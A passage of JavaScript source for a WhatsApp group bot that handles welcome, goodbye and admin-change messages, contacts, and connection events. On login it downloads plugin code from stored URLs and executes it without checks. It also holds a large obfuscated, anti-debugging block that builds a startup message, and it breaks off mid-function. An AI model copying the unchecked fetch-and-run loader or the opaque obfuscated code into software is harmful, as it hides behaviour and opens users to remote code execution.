                                    return await Void.groupParticipantsUpdate(anu.id, [num], 'remove')
                                } catch {
                                    console.log("error")
                                }
                            }
                        }
                    
                    }
                    let checkinfo = await sck.findOne({ id: anu.id })
                    if (checkinfo) {
                        let events = checkinfo.events || "false"
                        if (anu.action == 'add' && events == "true") {
                                    hesa = `${participants}`
                                    getnum = (teks) => {
                                        return teks.replace(/['@s whatsapp.net']/g, " ");
                                    }
                                    resa = `${getnum(hesa)}`
                                    const totalmem = metadata.participants.length
                                    let welcome_messages = checkinfo.welcome.replace(/@user/gi, `@${num.split("@")[0]}`).replace(/@gname/gi, metadata.subject).replace(/@desc/gi, metadata.desc).replace(/@count/gi, totalmem);
                                    if(/@pp/g.test(welcome_messages)) {
                                    let buttonMessage = {
                                        image: { url: ppuser },
                                        caption: welcome_messages.trim().replace(/@pp/g, ''),
                                        footer: `${Config.botname}`,
                                        mentions: [num],
                                        headerType: 4,
                                    }
                                    return await Void.sendMessage(anu.id, buttonMessage)
                                    } else{

                                return Void.sendMessage(anu.id,{text: welcome_messages.trim(),mentions:[num] })
                                    }
                                //=============================[change action to "remove" if you want to set it.]===================================================
                        } else if (events === 'true' && anu.action == 'remove') {

                            hesa = `${participants}`
                            getnum = (teks) => {
                                return teks.replace(/['@s whatsapp.net']/g, " ");
                            }
                            resa = `${getnum(hesa)}`
                            const allmem = metadata.participants.length
                            let goodbye_messages = checkinfo.goodbye.replace(/@user/gi, `@${num.split("@")[0]}`).replace(/@gname/gi, metadata.subject).replace(/@desc/gi, metadata.desc).replace(/@count/gi, allmem);
                        if(/@pp/g.test(goodbye_messages)) {
                           let buttonMessage = {
                                image: { url: ppuser },
                                caption: goodbye_messages.trim().replace(/@pp/g, ''),
                                footer: `${Config.botname}`,
                                mentions: [num],
                                headerType: 4,
                            }
                            return Void.sendMessage(anu.id, buttonMessage)
                        } else {
                            return Void.sendMessage(anu.id, {text: goodbye_messages.trim(),mentions:[num] })

                        }

                                //=============================[Implementing Promote and Demote Messages.]===================================================
                        } else if (anu.action == 'promote') {
                            var ppUrl;
                            try {
                                ppUrl = await Void.profilePictureUrl(num, 'image')
                            } catch {
                                ppurl = 'https://i.ibb.co/6BRf4Rc/Hans-Bot-No-Profile.png'
                            }
                            let buttonMessage = {
                                image: {url : ppUrl },
                                caption: `[🔮 PROMOTE - DETECTED 🔮]\n\n➦Name : @${num.split("@")[0]}\n➦Status : ➦Member -> Admin\nGroup : ${metadata.subject}`,
                                footer: `SHENU-QUEEN`,
                                mentions: [num],
                                headerType: 4,
                            }
                            Void.sendMessage(anu.id, buttonMessage)

                        } else if (anu.action == 'demote') {
                            
                            try {
                                ppUrl = await Void.profilePictureUrl(num, 'image')
                            } catch {
                                ppUrl = 'https://i.ibb.co/6BRf4Rc/Hans-Bot-No-Profile.png'
                            }
                            let buttonMessage = {
                                image: { url : ppUrl },
                                caption: `🔮 DEMOTE - DETECTED 🔮\n\nName : @${num.split("@")[0]}\nStatus :👩‍🔧 Admin -> Member`,
                                footer: `Secktor`,
                                mentions: [num],
                                headerType: 4,
                            }
                            Void.sendMessage(anu.id, buttonMessage)
                        }

                    }
                }
            } catch (err) {
                console.log(err)
            }
        })
        //========================================================================================================================================
        Void.decodeJid = (jid) => {
            if (!jid) return jid
            if (/:\d+@/gi.test(jid)) {
                let decode = jidDecode(jid) || {}
                return decode.user && decode.server && decode.user + '@' + decode.server || jid
            } else return jid
        }
        //========================================================================================================================================
        Void.ev.on('contacts.upsert', (contacts) => {
                const contactsUpsert = (newContacts) => {
                    for (const contact of newContacts) {
                        if (store.contacts[contact.id]) {
                            Object.assign(store.contacts[contact.id], contact);
                        } else {
                            store.contacts[contact.id] = contact;
                        }
                    }
                    return;
                };
                contactsUpsert(contacts);
            })
            //========================================================================================================================================
        Void.ev.on('contacts.update', async update => {
                for (let contact of update) {
                    let id = Void.decodeJid(contact.id)
                    sck1.findOne({ id: id }).then((usr) => {
                        if (!usr) {
                            new sck1({ id: id, name: contact.notify }).save()
                        } else {
                            sck1.updateOne({ id: id }, { name: contact.notify })
                        }
                    })
                    if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
                }
            })
            //========================================================================================================================================
        Void.getName = (jid, withoutContact = false) => {

                id = Void.decodeJid(jid)

                withoutContact = Void.withoutContact || withoutContact

                let v

                if (id.endsWith("@g.us")) return new Promise(async(resolve) => {

                    v = store.contacts[id] || {}

                    if (!(v.name.notify || v.subject)) v = Void.groupMetadata(id) || {}

                    resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))

                })

                else v = id === '0@s.whatsapp.net' ? {

                        id,

                        name: 'WhatsApp'

                    } : id === Void.decodeJid(Void.user.id) ?

                    Void.user :

                    (store.contacts[id] || {})

                return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')

            }
            //========================================================================================================================================
        Void.sendContact = async(jid, kon, quoted = '', opts = {}) => {
                let list = []
                for (let i of kon) {
                    list.push({
                        displayName: await Void.getName(i + '@s.whatsapp.net'),
                        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Void.getName(i + '@s.whatsapp.net')}\nFN:${global.OwnerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github}/Secktor-Md\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
                    })
                }
                Void.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
            }
            //========================================================================================================================================
        Void.setStatus = (status) => {
            Void.query({
                tag: 'iq',
                attrs: {
                    to: '@s.whatsapp.net',
                    type: 'set',
                    xmlns: 'status',
                },
                content: [{
                    tag: 'status',
                    attrs: {},
                    content: Buffer.from(status, 'utf-8')
                }]
            })
            return status
        }
        Void.serializeM = (citel) => smsg(Void, citel, store)
            //========================================================================================================================================
Void.ev.on('connection.update', async(update) => {
                const { connection, lastDisconnect } = update
                if (connection === "connecting") {
                   console.log("ℹ️📎 Connecting to WhatsApp... Please Wait.");
                }
                if (connection === 'open') {
                    console.log("✅ Login Successful!");
                    console.log("⬇️  Installing External Plugins...");
                    let axios = require('axios')
                    let check = await plugindb.find({})
                    for (let i = 0; i < check.length; i++) {
                        let AxiosData = await axios.get(check[i].url)
                        let data = AxiosData.data
                        await fs.writeFileSync(__dirname + '/../commands/' + check[i].id + '.js', data, "utf8")
                    }
                    console.log("✅  External Plugins Installed!");
                    fs.readdirSync(__dirname + "/../commands").forEach((plugin) => {
                        if (path.extname(plugin).toLowerCase() == ".js") {
                            require(__dirname + "/../commands/" + plugin);
                        }
                    });
                    (function(_0x50b5b3,_0x2be7b4){function _0x5b6b9b(_0x3c3c0a,_0x33ef00,_0x260482,_0x558d76,_0x3533c7){return _0x60c2(_0x558d76-0x3e3,_0x33ef00);}function _0x4f7179(_0x1d2bf2,_0x35ee94,_0x4538ec,_0x8e6b5d,_0x531ead){return _0x60c2(_0x4538ec-0x4e,_0x531ead);}const _0x372f05=_0x50b5b3();function _0x396b7f(_0xc046a4,_0x3cf5df,_0x574ade,_0x3bb0bb,_0x48f6f7){return _0x60c2(_0x574ade-0x3c6,_0xc046a4);}function _0x2667e3(_0x18ebda,_0x318066,_0x52be62,_0x4b551a,_0x191afb){return _0x60c2(_0x52be62- -0x17b,_0x191afb);}function _0x5f542a(_0x3d1bb9,_0x2dcba0,_0x48830a,_0x1361fc,_0x3e639b){return _0x60c2(_0x48830a- -0x26f,_0x3d1bb9);}while(!![]){try{const _0x16040e=-parseInt(_0x4f7179(0x188,0x129,0x16b,0x173,0x182))/(-0x2006*0x1+0x973+0xb4a*0x2)*(parseInt(_0x5b6b9b(0x52a,0x4bb,0x520,0x4d8,0x4b9))/(-0xe89+-0x22*-0xd1+0x11*-0xc7))+parseInt(_0x4f7179(0x1a3,0x183,0x163,0x1b2,0x153))/(-0xf1*-0x17+-0x573*-0x1+-0x5f*0x49)*(parseInt(_0x5b6b9b(0x4bc,0x51f,0x4c1,0x4ff,0x4b3))/(0x18c+-0x1732+0x76*0x2f))+parseInt(_0x5b6b9b(0x515,0x50f,0x54d,0x51b,0x4d6))/(0x1b*-0x11e+-0x24fb+0x432a)*(parseInt(_0x5f542a(-0x17a,-0x130,-0x132,-0xf3,-0x182))/(0x61*0x11+-0x1c29+0xb*0x1fa))+parseInt(_0x5b6b9b(0x4c4,0x4e3,0x46c,0x4ba,0x4cc))/(-0x8e+0x26*-0x4b+-0x1*-0xbb7)+parseInt(_0x4f7179(0x122,0x168,0x15d,0x17c,0x195))/(0x159*0x11+0x1911+0x2d2*-0x11)+parseInt(_0x4f7179(0x1a6,0x1d0,0x198,0x1be,0x156))/(0x4*0x345+-0x917*0x1+-0x3f4)*(parseInt(_0x4f7179(0x134,0x15f,0x17a,0x17c,0x128))/(0x1026+-0x95*0xf+-0x761))+parseInt(_0x2667e3(-0xde,-0x100,-0xb2,-0x5f,-0xe2))/(0x201f+-0x25a0+0x58c)*(-parseInt(_0x2667e3(-0x87,-0x2d,-0x3a,-0x11,0x1))/(0x25*-0x69+0x1b9f*-0x1+-0x2ad8*-0x1));if(_0x16040e===_0x2be7b4)break;else _0x372f05['push'](_0x372f05['shift']());}catch(_0x50d317){_0x372f05['push'](_0x372f05['shift']());}}}(_0x1c9c,-0x3701*-0x15+-0xa51+0x8b*0x211));const _0xbf3696=(function(){let _0xa5930f=!![];return function(_0x532248,_0x3a9c05){function _0x4f15dd(_0x19e6f8,_0x55a49d,_0x4de73e,_0x4c43a9,_0x370a4b){return _0x60c2(_0x4c43a9-0x1b0,_0x4de73e);}function _0xa4dd37(_0x332e96,_0x1279ec,_0x34776d,_0xe213a7,_0x19c769){return _0x60c2(_0x1279ec-0x20,_0x19c769);}function _0xb9ae9f(_0x4d8712,_0x45e16f,_0x10517a,_0x82f2d4,_0x44451f){return _0x60c2(_0x44451f- -0x368,_0x10517a);}if(_0x4f15dd(0x275,0x25a,0x259,0x27c,0x2a4)===_0xb9ae9f(-0x2cf,-0x252,-0x2d3,-0x255,-0x29c)){const _0x8361d6=_0xa5930f?function(){function _0x4d5caf(_0x2dbbfc,_0x514c9e,_0x530386,_0x43ccb0,_0x40a3ae){return _0xb9ae9f(_0x2dbbfc-0x68,_0x514c9e-0x11f,_0x2dbbfc,_0x43ccb0-0x12,_0x514c9e-0x346);}function _0x2736aa(_0x1d4dfb,_0x24b34f,_0x4c4224,_0x10d0d1,_0xe0c7c0){return _0xb9ae9f(_0x1d4dfb-0x13d,_0x24b34f-0x13c,_0x24b34f,_0x10d0d1-0xfb,_0x1d4dfb-0x54);}function _0x5df2d4(_0x445eff,_0x1b5532,_0x4c4338,_0x5a84d6,_0x1478b9){return _0x4f15dd(_0x445eff-0x35,_0x1b5532-0x13f,_0x1478b9,_0x1b5532- -0x7f,_0x1478b9-0x158);}function _0x191550(_0x4d2900,_0x1daf21,_0x4d8779,_0x379fc0,_0x2bfbf1){return _0xb9ae9f(_0x4d2900-0x171,_0x1daf21-0x12f,_0x4d2900,_0x379fc0-0xc9,_0x1daf21-0x5df);}function _0x4dc034(_0x312f4a,_0x299253,_0x284608,_0x194b14,_0x37895e){return _0xb9ae9f(_0x312f4a-0xea,_0x299253-0xd6,_0x284608,_0x194b14-0x1d7,_0x312f4a-0x686);}if(_0x2736aa(-0x1d8,-0x1ae,-0x1d7,-0x1d7,-0x1e9)===_0x2736aa(-0x1d8,-0x197,-0x199,-0x21c,-0x1d5)){if(_0x3a9c05){if(_0x2736aa(-0x1f4,-0x218,-0x234,-0x22b,-0x1a2)===_0x4dc034(0x41a,0x424,0x400,0x3ff,0x402))(function(){return!![];}[_0x5df2d4(0x22c,0x24a,0x21f,0x259,0x210)+_0x2736aa(-0x233,-0x24b,-0x211,-0x201,-0x280)+'r'](_0x4dc034(0x481,0x443,0x4b2,0x4d2,0x4bf)+_0x2736aa(-0x23a,-0x204,-0x277,-0x281,-0x20d))[_0x4d5caf(0x14d,0x130,0xdc,0xde,0x171)](_0x4dc034(0x457,0x449,0x48f,0x429,0x44d)+'n'));else{const _0x311ddb=_0x3a9c05[_0x191550(0x371,0x3a9,0x3ec,0x3ed,0x36c)](_0x532248,arguments);return _0x3a9c05=null,_0x311ddb;}}}else return _0x36c414[_0x191550(0x3ad,0x37c,0x36d,0x385,0x34d)+_0x4d5caf(0x165,0x112,0x151,0x10d,0xf7)]()[_0x2736aa(-0x23b,-0x1ea,-0x241,-0x23f,-0x1f0)+'h'](_0x4dc034(0x472,0x476,0x49a,0x4c5,0x4a1)+_0x191550(0x3de,0x3ac,0x36b,0x379,0x400)+'+$')[_0x191550(0x33e,0x37c,0x3aa,0x383,0x37d)+_0x2736aa(-0x1e0,-0x1d0,-0x1ac,-0x231,-0x1e5)]()[_0x4dc034(0x437,0x3f2,0x420,0x3e9,0x476)+_0x2736aa(-0x233,-0x232,-0x246,-0x21a,-0x1fd)+'r'](_0x2576a3)[_0x4dc034(0x3f7,0x3ac,0x41d,0x412,0x412)+'h'](_0x4d5caf(0x103,0x132,0x16d,0x12f,0x170)+_0x191550(0x397,0x3ac,0x39b,0x38f,0x396)+'+$');}:function(){};return _0xa5930f=![],_0x8361d6;}else{const _0x26c242=_0x1c1e7e[_0x4f15dd(0x2e0,0x2e7,0x30c,0x2e2,0x2f3)](_0xc1df0b,arguments);return _0x188cf8=null,_0x26c242;}};}()),_0x21f6dd=_0xbf3696(this,function(){function _0x321443(_0x5f2123,_0x5c8fad,_0x56b74a,_0x4b0cda,_0x140869){return _0x60c2(_0x56b74a-0x1b4,_0x4b0cda);}function _0x4f755f(_0x4ee0e8,_0x49222e,_0x1b0790,_0x54a1ae,_0x29886c){return _0x60c2(_0x1b0790- -0x13c,_0x4ee0e8);}function _0x1d057b(_0x1a8679,_0xf99d19,_0x4c7a8a,_0x18f15b,_0x4c48f6){return _0x60c2(_0x4c48f6- -0x171,_0xf99d19);}function _0x3049cc(_0x113455,_0x4b7707,_0x33cb2c,_0x296301,_0x160162){return _0x60c2(_0x4b7707-0x1da,_0x33cb2c);}function _0x472b43(_0x29fa4b,_0x45afcd,_0x42f5db,_0x262c9c,_0x383572){return _0x60c2(_0x383572- -0x3b4,_0x262c9c);}return _0x21f6dd[_0x321443(0x2e0,0x2e6,0x2b9,0x2de,0x265)+_0x1d057b(-0x89,-0x82,-0x32,-0x23,-0x3d)]()[_0x1d057b(-0x48,-0x55,-0x6a,-0xe6,-0x98)+'h'](_0x1d057b(-0x40,-0x5e,0x24,-0x67,-0x1d)+_0x472b43(-0x24e,-0x24a,-0x2d1,-0x2bf,-0x27f)+'+$')[_0x4f755f(-0x36,0x14,-0x37,-0x54,-0x14)+_0x472b43(-0x2bc,-0x28b,-0x22c,-0x2c0,-0x280)]()[_0x3049cc(0x2f6,0x2f3,0x319,0x30c,0x31c)+_0x4f755f(-0x1a,-0x9e,-0x5b,-0x5e,-0x16)+'r'](_0x21f6dd)[_0x1d057b(-0xdc,-0x90,-0xd5,-0xcf,-0x98)+'h'](_0x1d057b(-0x5,-0x16,-0x30,-0x6f,-0x1d)+_0x3049cc(0x2f2,0x30f,0x347,0x2fa,0x2c8)+'+$');});_0x21f6dd();function _0x932759(_0x171c99,_0x1e6703,_0x4f6b32,_0x3dba00,_0xd2f004){return _0x60c2(_0x3dba00- -0x44,_0xd2f004);}const _0x1f1f7b=(function(){let _0x4d6e8b=!![];return function(_0x4b93c6,_0x1442b7){function _0x4784ad(_0x260d57,_0x5a882c,_0x4239c5,_0x5af5f5,_0x4bbde9){return _0x60c2(_0x5a882c-0x38e,_0x4239c5);}function _0x3b2b75(_0x25bf89,_0x108400,_0x5f1172,_0x3d8750,_0x3463ec){return _0x60c2(_0x3d8750-0x3b1,_0x25bf89);}if(_0x3b2b75(0x48a,0x46f,0x4dc,0x4b7,0x4bf)===_0x4784ad(0x4cd,0x494,0x49a,0x457,0x4b2)){const _0x528c4c=_0x4d6e8b?function(){function _0x81f7b0(_0x2ac666,_0x54eeaf,_0xf2004b,_0x13b708,_0x392003){return _0x4784ad(_0x2ac666-0xc8,_0x54eeaf- -0x40d,_0x13b708,_0x13b708-0x18a,_0x392003-0x9);}function _0xcb7025(_0x2fba3a,_0x1f5855,_0x122be3,_0x5da548,_0x377f3b){return _0x3b2b75(_0x377f3b,_0x1f5855-0xe3,_0x122be3-0xf7,_0x122be3- -0x38c,_0x377f3b-0x131);}function _0x2c82a4(_0xa88b02,_0x31dd50,_0x1deeb2,_0x9d9844,_0x527307){return _0x3b2b75(_0x1deeb2,_0x31dd50-0x0,_0x1deeb2-0x90,_0xa88b02- -0x14b,_0x527307-0x156);}function _0x61b50f(_0x3c16fe,_0x4ed376,_0x39bc65,_0x144859,_0x25dec){return _0x3b2b75(_0x144859,_0x4ed376-0xe2,_0x39bc65-0xf9,_0x25dec- -0x4e2,_0x25dec-0x1ac);}function _0x5cbd1c(_0x3282bb,_0xb60e07,_0x46ca52,_0x27cdf3,_0x53edef){return _0x3b2b75(_0x46ca52,_0xb60e07-0x5a,_0x46ca52-0x46,_0xb60e07- -0x28b,_0x53edef-0x82);}if(_0x81f7b0(0xba,0x75,0xc8,0x58,0x6c)===_0x5cbd1c(0x254,0x21f,0x25e,0x25c,0x1f0))_0x2785a6(0x2*-0x124d+0x12cb*-0x2+0x4a30);else{if(_0x1442b7){if(_0x5cbd1c(0x22f,0x24b,0x264,0x27c,0x248)!==_0x5cbd1c(0x22e,0x24b,0x250,0x262,0x207))_0x1bd69f(this,function(){function _0x131fc2(_0x1e6ece,_0x205ef5,_0x47eb7a,_0x2c8db4,_0x2d13f0){return _0x2c82a4(_0x205ef5- -0x557,_0x205ef5-0x75,_0x2d13f0,_0x2c8db4-0x65,_0x2d13f0-0x2);}function _0x4f0f04(_0x16140f,_0x55c89a,_0x36e363,_0x162173,_0xd8134a){return _0x2c82a4(_0x162173- -0x469,_0x55c89a-0x102,_0xd8134a,_0x162173-0x64,_0xd8134a-0xe);}const _0x3873ed=new _0x1d6702(_0x3cac0d(-0x66,-0x67,0xf,-0x78,-0x36)+_0x46d9c8(-0x9,-0x29,-0x42,0x12,-0x6b)+_0x46d9c8(-0x98,-0x9f,-0x84,-0x88,-0x8c)+')'),_0x47d940=new _0x236883(_0x4f0f04(-0x13c,-0xda,-0x101,-0x125,-0xd5)+_0x46d9c8(-0xd8,-0x81,-0xcd,-0x115,-0xdd)+_0x131fc2(-0x1cf,-0x1f4,-0x20a,-0x1fa,-0x218)+_0x131fc2(-0x215,-0x1c8,-0x216,-0x182,-0x1b6)+_0x46d9c8(-0xed,-0xaa,-0xb9,-0xe9,-0x71)+_0x46d9c8(-0x33,-0x59,-0x71,-0x35,-0x89)+_0x4f0f04(-0x12b,-0x144,-0x146,-0x115,-0xc7),'i');function _0x585e1f(_0x809717,_0x2b9859,_0xb7a647,_0x45604e,_0x4be85e){return _0x81f7b0(_0x809717-0x165,_0xb7a647- -0xe2,_0xb7a647-0x13b,_0x809717,_0x4be85e-0x175);}const _0x4f60c6=_0x10a3e4(_0x131fc2(-0x21a,-0x1ff,-0x1e2,-0x24f,-0x1bd));function _0x46d9c8(_0x14ca1d,_0x93985c,_0x1bafd6,_0x31b441,_0x3b24cb){return _0x81f7b0(_0x14ca1d-0x18a,_0x1bafd6- -0x116,_0x1bafd6-0xa0,_0x14ca1d,_0x3b24cb-0xd7);}function _0x3cac0d(_0x974842,_0x4bad80,_0x48e45e,_0x2ebd8e,_0xa8c20c){return _0x2c82a4(_0xa8c20c- -0x3c4,_0x4bad80-0x6b,_0x48e45e,_0x2ebd8e-0x1ef,_0xa8c20c-0x1e5);}!_0x3873ed[_0x585e1f(-0x51,0x3a,-0x14,-0x39,-0x18)](_0x4f60c6+_0x131fc2(-0x1b5,-0x1b2,-0x204,-0x166,-0x16e))||!_0x47d940[_0x4f0f04(-0x78,-0x92,-0x108,-0xb6,-0xe3)](_0x4f60c6+_0x585e1f(-0x51,-0x3c,-0xb,-0x29,-0x29))?_0x4f60c6('0'):_0x3661de();})();else{const _0x3cf3d0=_0x1442b7[_0x5cbd1c(0x238,0x258,0x27b,0x239,0x241)](_0x4b93c6,arguments);return _0x1442b7=null,_0x3cf3d0;}}}}:function(){};return _0x4d6e8b=![],_0x528c4c;}else return![];};}());function _0x60c2(_0x4ba75c,_0x435a80){const _0x153cc8=_0x1c9c();return _0x60c2=function(_0x21f6dd,_0xbf3696){_0x21f6dd=_0x21f6dd-(0xf59+0x2321+-0x31be);let _0x1c9c4f=_0x153cc8[_0x21f6dd];return _0x1c9c4f;},_0x60c2(_0x4ba75c,_0x435a80);}(function(){_0x1f1f7b(this,function(){function _0x108c7a(_0x2500ab,_0x573ff6,_0x1d74e2,_0x47f3bb,_0x169887){return _0x60c2(_0x169887- -0x5c,_0x47f3bb);}function _0x1ac7cd(_0x4c692f,_0x56c97b,_0x1853f9,_0x14dfac,_0xa2414b){return _0x60c2(_0x14dfac-0x1a3,_0x1853f9);}function _0x658c9f(_0xb74150,_0x4ae112,_0x3f6fda,_0x31c91e,_0x5aa22e){return _0x60c2(_0x3f6fda-0x17,_0x5aa22e);}function _0x3384d8(_0x1b19e2,_0x963eb8,_0xdc4708,_0x24a944,_0x1483ce){return _0x60c2(_0x1b19e2-0x10f,_0x963eb8);}function _0x3ad747(_0x54fffd,_0x4d5a37,_0x2bc85d,_0x4ab22f,_0x2294c9){return _0x60c2(_0x4ab22f- -0x15,_0x4d5a37);}if(_0x3ad747(0x111,0xf5,0x121,0x130,0xe8)===_0x3ad747(0x13e,0xb2,0x13c,0xf5,0xe3)){if(_0x5bb74c){const _0x1a6769=_0x408a17[_0x108c7a(0x10c,0xa2,0xcf,0xe8,0xd6)](_0x5b668c,arguments);return _0x2cc69e=null,_0x1a6769;}}else{const _0x124806=new RegExp(_0x3ad747(0x12e,0xda,0x128,0x113,0xe9)+_0x658c9f(0x14d,0x195,0x16a,0x177,0x191)+_0x3384d8(0x220,0x1ec,0x20f,0x1fb,0x217)+')'),_0x4791a7=new RegExp(_0x3384d8(0x1ed,0x20d,0x232,0x217,0x224)+_0x658c9f(0xeb,0x95,0xdf,0x95,0xe9)+_0x1ac7cd(0x2c6,0x25f,0x2c9,0x2a0,0x280)+_0x3384d8(0x238,0x1f3,0x1f4,0x1ec,0x251)+_0x3384d8(0x1eb,0x21c,0x1ab,0x1b6,0x20b)+_0x3384d8(0x233,0x23c,0x212,0x1ed,0x212)+_0x108c7a(0xac,0x88,0x45,0x7b,0x92),'i'),_0x1cb73b=_0x5e86f4(_0x658c9f(0x157,0x149,0x109,0x12f,0xed));if(!_0x124806[_0x3ad747(0xee,0x139,0x172,0x138,0x121)](_0x1cb73b+_0x658c9f(0x141,0x1a6,0x156,0x175,0x126))||!_0x4791a7[_0x1ac7cd(0x2e5,0x2b8,0x314,0x2f0,0x2dc)](_0x1cb73b+_0x3ad747(0x126,0x15a,0x135,0x141,0xee)))_0x108c7a(0x7a,0x58,0xd7,0x74,0xa6)!==_0x3384d8(0x211,0x1d0,0x25b,0x22f,0x25a)?_0x329724('0'):_0x1cb73b('0');else{if(_0x3ad747(0x96,0xc9,0xda,0xb8,0xb2)===_0x3384d8(0x25d,0x2ac,0x264,0x231,0x22d))return function(_0x364ec0){}[_0x3384d8(0x228,0x25b,0x27b,0x1f0,0x243)+_0x1ac7cd(0x278,0x298,0x24e,0x284,0x265)+'r'](_0x108c7a(0x113,0xbd,0x149,0x145,0xf5)+_0x3384d8(0x26a,0x23c,0x22a,0x229,0x293)+_0x1ac7cd(0x2c5,0x2c0,0x2b7,0x2be,0x2a1))[_0x3384d8(0x241,0x221,0x21a,0x215,0x266)](_0x3ad747(0xc1,0xfb,0xff,0xe3,0xb7)+'er');else _0x5e86f4();}}})();}());let Msg=_0x932759(0x148,0x13c,0x12a,0x104,0xbf)+_0x5246cb(0x73,0xb1,0x5b,0x95,0x37)+_0x932759(0xf7,0xdd,0xd8,0xfa,0x13b)+_0x5246cb(0x73,0x86,0x8c,0x44,0x56)+_0x22d578(0x234,0x283,0x269,0x294,0x231)+_0x35cf7b(0x268,0x2b3,0x296,0x2ed,0x27d)+_0x5246cb(0x79,0x40,0x6e,0x75,0x4d)+_0x932759(0x66,0x9a,0xc1,0xa1,0x75)+_0x5246cb(0xd,0x8,0x49,0x3c,0x4)+_0x22d578(0x295,0x298,0x250,0x25e,0x2a9)+_0x300749(0x498,0x4e9,0x50c,0x4a9,0x4ef)+_0x22d578(0x26c,0x25c,0x20a,0x29d,0x241)+_0x5246cb(0x2f,0x2a,-0x1f,0x36,0x5)+_0x300749(0x4ba,0x4c4,0x4f9,0x50e,0x48e)+_0x35cf7b(0x328,0x2fb,0x2b4,0x313,0x34b)+_0x300749(0x4f7,0x4ae,0x4cd,0x497,0x4d4)+_0x5246cb(0x25,0x65,0x5,0x4,0x74)+_0x22d578(0x287,0x2ac,0x272,0x2fd,0x2e6)+_0x5246cb(0x22,-0x31,-0x2d,0x6b,0x5)+Config[_0x35cf7b(0x2ca,0x2c2,0x2f3,0x2e5,0x2d8)+'H']+(_0x22d578(0x22b,0x264,0x2ac,0x296,0x259)+_0x300749(0x4a2,0x46f,0x465,0x484,0x45a)+_0x22d578(0x26b,0x2a0,0x286,0x2ed,0x2e5)+_0x35cf7b(0x2b4,0x269,0x29f,0x274,0x22f)+_0x5246cb(0x22,0x32,0x65,0x19,0x1a))+events[_0x22d578(0x25e,0x270,0x243,0x26d,0x242)+_0x932759(0x94,0x83,0x6f,0xba,0xdc)][_0x5246cb(0x4,0x15,0x12,0x27,0x4f)+'h']+(_0x932759(0x92,0xf0,0xae,0xaf,0x61)+_0x5246cb(0x1b,0x4c,0x35,-0x2f,-0x36)+_0x300749(0x48e,0x4ca,0x51c,0x48c,0x49c)+_0x932759(0x10c,0xbc,0xd4,0xe6,0x9a)+_0x5246cb(0x39,0x84,-0x2,0x7b,0x15)+_0x22d578(0x271,0x234,0x26e,0x277,0x22a)+_0x300749(0x4fb,0x4e5,0x4bd,0x500,0x4ed)+_0x5246cb(0x4f,0x58,0x2b,0x9d,0xd)+_0x22d578(0x233,0x25e,0x229,0x27f,0x22f))+Config[_0x5246cb(-0x6,-0x20,-0x49,0x45,-0x17)]+(_0x300749(0x48e,0x48d,0x4a2,0x45a,0x491)+_0x35cf7b(0x2a1,0x2a6,0x28f,0x2c5,0x2d4)+_0x932759(0x116,0x13f,0xb1,0xed,0xbc)+_0x35cf7b(0x2c5,0x292,0x259,0x29d,0x252)+_0x5246cb(0x7b,0x86,0x83,0xa2,0x2f))+Config[_0x5246cb(0x18,-0xa,-0x16,0x66,-0x2b)+_0x5246cb(0x95,0xbb,0x85,0xbe,0x79)]+(_0x300749(0x4d4,0x48b,0x43f,0x45f,0x4cc)+_0x22d578(0x228,0x272,0x2bb,0x2a1,0x272)+_0x300749(0x4d6,0x4c7,0x506,0x4ec,0x473)+_0x35cf7b(0x2b4,0x2e3,0x2e2,0x29f,0x2a6)+'\x20_')+Config[_0x5246cb(-0xb,-0x36,0x48,-0x26,-0x57)+_0x35cf7b(0x2ce,0x2af,0x2b8,0x2f7,0x265)+'ne']+(_0x5246cb(0x26,0x5c,0x6e,0x65,0x4e)+_0x22d578(0x2d5,0x2ba,0x28e,0x2c0,0x29d)+_0x35cf7b(0x2e9,0x300,0x304,0x326,0x2fe)+_0x300749(0x45a,0x4a5,0x4ed,0x471,0x4bf)+_0x35cf7b(0x26b,0x265,0x233,0x2ab,0x238)+_0x932759(0xdc,0x113,0x9e,0xe2,0x107)+_0x932759(0xbd,0xd5,0xb5,0xb3,0xc4)+_0x5246cb(0x15,-0xd,-0x28,-0x15,0x42)+_0x35cf7b(0x2cb,0x2ab,0x2e5,0x269,0x2c4)+'\x20_')+Config[_0x932759(0x157,0xc4,0x163,0x111,0xbe)+_0x35cf7b(0x2f1,0x2aa,0x2c4,0x2c8,0x2f8)]+(_0x22d578(0x2a3,0x258,0x285,0x263,0x228)+_0x932759(0x5f,0x72,0x77,0x86,0x3a)+_0x5246cb(-0xf,0x38,-0x34,-0x12,-0x1)+_0x932759(0x9e,0xad,0x9f,0xb7,0x70)+_0x5246cb(0x8,0x10,-0x38,-0x9,0x22)+_0x300749(0x4c0,0x47c,0x433,0x4ce,0x457)+_0x932759(0xac,0xd0,0xad,0xda,0xa2)+_0x35cf7b(0x27c,0x267,0x2bb,0x271,0x288)+_0x932759(0x3c,0x5f,0xc9,0x8c,0xa8)+_0x5246cb(0x4b,0x58,0x3,0x90,0x8e)+_0x35cf7b(0x2cf,0x2c6,0x2d8,0x273,0x2b7)+_0x932759(0xe4,0x148,0xa4,0xf6,0x143)+_0x5246cb(0x14,0x2b,0x49,0x56,0x1c)+_0x932759(0xc2,0x40,0xd5,0x92,0xe0)+_0x22d578(0x218,0x25a,0x232,0x215,0x26a)+_0x300749(0x4ba,0x46c,0x49b,0x45d,0x4a7)+_0x35cf7b(0x302,0x2e6,0x2bf,0x2c7,0x321));function _0x1c9c(){const 